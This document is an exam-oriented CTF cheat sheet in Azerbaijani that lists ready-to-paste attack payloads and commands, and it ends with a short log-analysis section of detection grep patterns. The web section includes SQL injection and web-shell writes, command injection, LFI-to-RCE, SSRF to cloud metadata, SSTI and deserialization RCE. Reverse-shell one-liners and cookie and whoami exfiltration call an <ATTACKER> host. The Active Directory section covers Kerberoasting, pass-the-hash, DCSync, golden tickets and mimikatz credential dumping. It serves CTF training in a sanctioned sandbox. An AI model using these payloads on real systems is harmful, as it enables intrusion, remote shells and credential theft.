# CTF Cheat Sheet — Sprint II Final Exam
### Web App Attacks · Active Directory · Log Analysis

> Bu sənəd imtahanın CTF mühiti (icazəli, sandbox) üçündür. Hər payload-u kor-koranə yapışdırmaq əvəzinə, **nə etdiyini başa düş** — müsabiqədə əsas olan budur.

---

## 0. Ümumi iş axını (Workflow)

```bash
# Recon — port & service
nmap -sC -sV -p- -T4 <IP> -oN nmap.txt
nmap -sU --top-ports 50 <IP>            # UDP

# Web fingerprint
whatweb http://<IP>
nikto -h http://<IP>

# Directory / file brute force
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raccoon.txt

# Subdomain / vhost
ffuf -u http://<IP> -H "Host: FUZZ.target.com" -w subdomains.txt -fs <baseline_size>
```

**Quick wins yoxla:** `/robots.txt`, `/.git/`, `/backup`, `/admin`, default kreditlər, kommentlərdə açıqlanan məlumat, `view-source`.

---

## I. WEB APPLICATION ATTACKS

### 1.1 SQL Injection (SQLi)

**Aşkarlama (detection):**
```
'        "        `        \        ;
' OR '1'='1
' AND 1=1 -- -          (true)
' AND 1=2 -- -          (false → fərq varsa SQLi var)
```

**Authentication bypass:**
```sql
admin' -- -
admin' #
' OR 1=1 -- -
' OR '1'='1' -- -
") OR ("1"="1
admin'/*
```

**UNION-based (sütun sayını tap, sonra data çək):**
```sql
' ORDER BY 1 -- -          # xəta verənə qədər artır → sütun sayı
' UNION SELECT NULL,NULL,NULL -- -
' UNION SELECT 1,2,3 -- -   # hansı sütun ekranda görünür
' UNION SELECT 1,version(),database() -- -
' UNION SELECT 1,user(),@@version -- -

# Schema enumeration (MySQL)
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() -- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' -- -
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users -- -
```

**Error-based (MySQL):**
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version()))) -- -
' AND updatexml(1,concat(0x7e,(SELECT database())),1) -- -
```

**Blind — Boolean:**
```sql
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' -- -
' AND (SELECT COUNT(*) FROM users)>5 -- -
```

**Blind — Time-based:**
```sql
' AND SLEEP(5) -- -
' OR IF(1=1,SLEEP(5),0) -- -
'; WAITFOR DELAY '0:0:5' -- -        # MSSQL
' AND pg_sleep(5) -- -                # PostgreSQL
```

**Fayl oxu/yaz (MySQL, FILE privilege):**
```sql
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3 -- -
' UNION SELECT 1,'<?php system($_GET[c]); ?>',3 INTO OUTFILE '/var/www/html/sh.php' -- -
```

**sqlmap (avtomatlaşdırma):**
```bash
sqlmap -u "http://<IP>/page?id=1" --batch --dbs
sqlmap -u "http://<IP>/page?id=1" -D <db> --tables
sqlmap -u "http://<IP>/page?id=1" -D <db> -T users --dump
sqlmap -r request.txt --batch --dump        # Burp-dan saxlanan request
sqlmap -u "..." --os-shell                   # RCE cəhdi
```

---

### 1.2 Command Injection

**Separatorlar:**
```
;   |   ||   &   &&   `cmd`   $(cmd)   %0a (newline)
```

**Nümunələr:**
```bash
; cat /etc/passwd
| whoami
|| id
& dir
`id`
$(whoami)
127.0.0.1; cat /etc/passwd
127.0.0.1 | nc <ATTACKER> 4444 -e /bin/bash
```

**Blind (cavab görünmür):**
```bash
# Time-based
; sleep 5
& ping -c 5 127.0.0.1

# Out-of-band (OOB)
; curl http://<ATTACKER>/$(whoami)
; nslookup `whoami`.<ATTACKER>
```

**Filter bypass:**
```bash
cat${IFS}/etc/passwd          # boşluq filtrlənibsə ${IFS}
c''at /etc/pa''sswd           # keyword filter
/???/??t /etc/passwd          # wildcard
$(printf '\x63\x61\x74') ...  # encoding
cat /etc/passwd | base64      # output encode et
```

---

### 1.3 File Inclusion (LFI / RFI)

**LFI — path traversal:**
```
../../../../etc/passwd
....//....//etc/passwd                 # filter atlama
..%2f..%2f..%2fetc%2fpasswd            # URL encode
/etc/passwd%00                         # null byte (köhnə PHP)
../../../etc/passwd%00.png
```

**PHP wrappers (LFI → mənbə oxu / RCE):**
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==
expect://id
php://input    + POST body: <?php system('id'); ?>
```

**Maraqlı LFI hədəfləri:**
```
/etc/passwd               /etc/shadow              /etc/hosts
/proc/self/environ        /proc/self/cmdline
/var/log/apache2/access.log    (log poisoning)
/var/log/auth.log
~/.ssh/id_rsa             /root/.bash_history
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
```

**Log poisoning (LFI → RCE):**
```bash
# User-Agent-ə PHP yerləşdir, sonra log faylını include et
curl -A "<?php system(\$_GET['c']); ?>" http://<IP>/
# sonra: ?file=/var/log/apache2/access.log&c=id
```

**RFI (allow_url_include=On):**
```
?file=http://<ATTACKER>/shell.txt
?file=data://text/plain;base64,...
```

---

### 1.4 SSRF (Server-Side Request Forgery)

**Əsas:**
```
http://127.0.0.1/
http://localhost:8080/admin
http://127.0.0.1:6379/        (Redis, vs daxili xidmətlər)
file:///etc/passwd
```

**Cloud metadata (vacib hədəflər):**
```
http://169.254.169.254/latest/meta-data/                  # AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/       # GCP (Header: Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance?api-version=2021-02-01   # Azure
```

**Filter bypass:**
```
http://0.0.0.0/                http://0/
http://127.1/                  http://[::]/
http://2130706433/             # 127.0.0.1 decimal
http://0x7f.0x0.0x0.0x1/       # hex
http://127.0.0.1.nip.io/       # DNS rebinding
http://localhost#@evil.com/    # parser confusion
```

**Protokollar:**
```
gopher://127.0.0.1:6379/_...   # Redis/RCE üçün güclü
dict://127.0.0.1:11211/        # Memcached
```

---

### 1.5 IDOR (Insecure Direct Object Reference)

```
/account?id=1001  →  1002, 1000, 999...
/api/user/5/invoice  →  /api/user/6/invoice
/download?file=user1_report.pdf  →  admin_report.pdf

# Encode olunmuş ID-lər
base64: MTAwMQ==  →  decode, dəyiş, encode
# Method tampering: GET → POST, PUT, DELETE
# Parameter pollution: ?id=1&id=2
# Header: X-User-Id, X-Account-Id dəyiş
```

Burp **Intruder** ilə ID aralığını brute force et, fərqli cavab ölçüsü/statusu axtar.

---

### 1.6 Advanced Web Attacks

**SSTI (Server-Side Template Injection):**
```
Detection:  ${7*7}   {{7*7}}   #{7*7}   <%= 7*7 %>
→ 49 qayıdırsa SSTI var

# Jinja2 (Python/Flask) RCE
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# Twig (PHP)
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

**XXE (XML External Entity):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><data>&xxe;</data></root>

<!-- SSRF via XXE -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>

<!-- PHP filter ilə mənbə oxu -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">

<!-- Blind / OOB (xarici DTD) -->
<!DOCTYPE foo [ <!ENTITY % ext SYSTEM "http://<ATTACKER>/evil.dtd"> %ext; ]>
```

**XSS (Cross-Site Scripting):**
```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
<body onload=alert(1)>
javascript:alert(1)

<!-- Cookie exfiltration -->
<script>new Image().src='http://<ATTACKER>/c='+document.cookie</script>

<!-- Filter bypass -->
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="&#97;lert(1)">
<svg/onload=alert`1`>
```

**Insecure Deserialization:**
```
# PHP — object injection
O:4:"User":1:{s:8:"isAdmin";b:1;}

# Python pickle RCE (kontrol etdiyin serialized data)
import pickle, os
class E: 
    def __reduce__(self): return (os.system,('id',))
# base64(pickle.dumps(E())) → tətbiqə göndər

# Java — ysoserial istifadə et
java -jar ysoserial.jar CommonsCollections1 'id' | base64
```

**File Upload bypass (web shell):**
```
shell.php.jpg          shell.pHp          shell.phtml / .php5 / .phar
# Magic bytes əlavə et: GIF89a;<?php system($_GET['c']); ?>
# Content-Type-ı image/png et, məzmunu PHP saxla
# .htaccess yüklə:  AddType application/x-httpd-php .jpg
```

---

### 1.7 Reverse Shell tək sətirlər (RCE-dən sonra)

```bash
# Bash
bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1

# nc
nc -e /bin/bash <ATTACKER> 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER> 4444 >/tmp/f

# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<ATTACKER>",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$s=fsockopen("<ATTACKER>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Listener (öz maşınında)
nc -lvnp 4444

# Shell-i stabilləşdir
python3 -c 'import pty;pty.spawn("/bin/bash")'
# CTRL+Z → stty raw -echo; fg → export TERM=xterm
```

> Reverse shell üçün **PayloadsAllTheThings** və **revshells.com** çox faydalıdır.

---

## II. ACTIVE DIRECTORY ATTACKS

### 2.1 Enumeration

```bash
# Anonim / kreditsiz
enum4linux-ng -A <DC_IP>
nxc smb <DC_IP> -u '' -p '' --shares       # nxc = NetExec (CrackMapExec)
rpcclient -U "" -N <DC_IP>     →  enumdomusers, querydispinfo
smbclient -L //<DC_IP>/ -N
ldapsearch -x -H ldap://<DC_IP> -b "dc=corp,dc=local"

# User enumeration (Kerberos)
kerbrute userenum -d corp.local --dc <DC_IP> users.txt

# Kreditlə
nxc smb <DC_IP> -u user -p pass --users --groups --shares
bloodhound-python -d corp.local -u user -p pass -ns <DC_IP> -c All
# və ya: SharpHound.exe -c All
```

### 2.2 Credential Attacks

**AS-REP Roasting (preauth söndürülmüş istifadəçilər):**
```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip <DC_IP> -no-pass
impacket-GetNPUsers corp.local/user:pass -request -dc-ip <DC_IP>
hashcat -m 18200 hashes.txt rockyou.txt
```

**Kerberoasting (SPN olan service account-lar):**
```bash
impacket-GetUserSPNs corp.local/user:pass -dc-ip <DC_IP> -request
# Windows: Rubeus.exe kerberoast
hashcat -m 13100 spn_hashes.txt rockyou.txt
```

**Password spraying:**
```bash
nxc smb <DC_IP> -u users.txt -p 'Spring2025!' --continue-on-success
kerbrute passwordspray -d corp.local --dc <DC_IP> users.txt 'Welcome1'
```

**LLMNR/NBT-NS poisoning (şəbəkə daxili):**
```bash
sudo responder -I eth0 -wd
# Tutulan NetNTLMv2 hash:
hashcat -m 5600 hash.txt rockyou.txt
```

### 2.3 Lateral Movement

```bash
# Pass-the-Hash
impacket-psexec corp.local/admin@<IP> -hashes :<NTLM>
impacket-wmiexec corp.local/admin@<IP> -hashes :<NTLM>
nxc smb <subnet> -u admin -H <NTLM> --local-auth

# evil-winrm (parol və ya hash ilə)
evil-winrm -i <IP> -u admin -p pass
evil-winrm -i <IP> -u admin -H <NTLM>

# Pass-the-Ticket
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass corp.local/user@target
```

### 2.4 Privilege Escalation / Domain Dominance

```bash
# DCSync (Replication hüququ varsa → bütün hashlar)
impacket-secretsdump corp.local/admin:pass@<DC_IP>
impacket-secretsdump -hashes :<NTLM> corp.local/admin@<DC_IP>
# mimikatz: lsadump::dcsync /domain:corp.local /user:krbtgt

# ACL abuse (BloodHound göstərir): GenericAll, WriteDACL, ForceChangePassword
net rpc password "victim" "NewPass123!" -U "corp.local"/"attacker"%"pass" -S <DC_IP>

# Golden Ticket (krbtgt hash lazımdır)
# mimikatz: kerberos::golden /user:Admin /domain:corp.local /sid:<SID> /krbtgt:<HASH> /ptt
impacket-ticketer -nthash <krbtgt> -domain-sid <SID> -domain corp.local Administrator

# Delegation
# Unconstrained → TGT topla;  Constrained → S4U;  RBCD → resource-based
findDelegation.py corp.local/user:pass
```

**mimikatz əsas əmrlər (Windows host):**
```
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
lsadump::sam
lsadump::lsa /patch
```

**Windows local privesc — sürətli yoxlama:**
```
whoami /priv          # SeImpersonate → PrintSpoofer / Potato
systeminfo            # patch səviyyəsi
# Avtomatlaşdırma: winPEAS.exe ;  Linux: linpeas.sh
```

---

## III. LOG ANALYSIS (Forensics)

### 3.1 Əsas alətlər

```bash
grep "pattern" access.log
grep -i "union\|select\|../\|<script" access.log     # hücum izləri
awk '{print $1}' access.log | sort | uniq -c | sort -rn   # top IP-lər
cut -d'"' -f2 access.log | sort | uniq -c | sort -rn       # top request-lər
tail -f auth.log
```

### 3.2 Web log-da hücum aşkarlama

```bash
# Scanner / tool aşkarlama (User-Agent)
grep -iE "sqlmap|nikto|nmap|gobuster|dirbuster|wpscan|curl|python" access.log

# SQLi cəhdləri
grep -iE "union|select|0x|information_schema|sleep\(|' or " access.log

# LFI / path traversal
grep -E "\.\./|%2e%2e|/etc/passwd|php://" access.log

# XSS cəhdləri
grep -iE "<script|onerror|onload|javascript:|alert\(" access.log

# Brute force (eyni IP, çoxlu 401/403/200 login)
awk '$9==401 {print $1}' access.log | sort | uniq -c | sort -rn

# Uğurla data sızması (böyük cavab + 200)
awk '$9==200 && $10>100000 {print}' access.log
```

### 3.3 Auth log (Linux)

```bash
# Uğursuz girişlər
grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
# Uğurlu girişlər
grep "Accepted password" auth.log
# Brute force-dan sonra uğur (hücumçunu tap)
grep "Accepted" auth.log     # uğursuzlardan dərhal sonra gələn IP
# Yeni istifadəçi / sudo abuse
grep -E "useradd|usermod|sudo:.*COMMAND" auth.log
```

### 3.4 Apache/Nginx log formatı (xatırlatma)

```
IP - - [date] "METHOD /path HTTP/1.1" STATUS SIZE "referer" "user-agent"
$1=IP  $6=method  $7=path  $9=status  $10=size
```

**Timeline qur:** hücumçu IP-ni tap → həmin IP-nin bütün request-lərini `grep <IP> access.log` ilə çıxar → ardıcıllığı oxu (recon → exploit → shell).

---

## Faydalı Resurslar (referans)

- **HackTricks** — book.hacktricks.xyz (hər mövzu üçün dərin)
- **PayloadsAllTheThings** — GitHub (payload kolleksiyaları)
- **PortSwigger Web Security Academy** — labs + nəzəriyyə
- **GTFOBins** — Linux privesc binary-ləri
- **LOLBAS** — Windows binary-ləri
- **revshells.com** — reverse shell generator
- **CrackStation / hashcat** — hash sındırma

---

### Müsabiqə taktikası (sürətli xatırlatma)
1. **Enumerate çox, exploit az** — vaxtının çoxu recon olsun.
2. Asanı əvvəl al — sürətli flag-lər moralı qaldırır.
3. Hər tapıntını qeyd et (IP, port, kredit, path).
4. Bir hədəfdə ilişib qalma — 20-30 dəq sonra başqasına keç.
5. Default kreditlər və açıq config-lər çox vaxt ən sürətli yoldur.

**Uğurlar! 🚩**
